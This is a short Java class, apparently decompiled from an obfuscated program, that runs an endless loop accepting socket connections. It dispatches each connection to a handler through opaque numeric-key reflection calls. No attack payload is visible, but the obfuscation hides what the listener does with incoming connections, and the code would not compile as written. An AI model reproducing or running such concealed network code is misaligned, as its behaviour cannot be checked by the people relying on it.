import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.ServerSocket;
import java.net.Socket;

class ga_2 implements Runnable {
   final xB K;

   ga_2(xB var1) {
      this.K = var1;
   }

   @Override
   public void run() {
      while (true) {
         try {
            Socket var1 = ((ServerSocket)com.c.c(451006777344254157L).get(com.c.c(531809486992927708L).get(this))).accept();
            Method var10000 = (Method)com.c.c(388376917454860932L).get(null);
            Object[] var10001 = com.c.a(new lJ_3(this, var1));
            Method var10003 = com.c.d(434592463220957006L);
            Object[] var10002 = var10001;
            var10001 = var10000;
            var10000 = var10003;

            try {
               var10000.invoke(var10001, var10002);
            } catch (InvocationTargetException var2) {
               throw var2.getTargetException();
            }
         } catch (IOException var3) {
            var3.printStackTrace();
         }
      }
   }
}





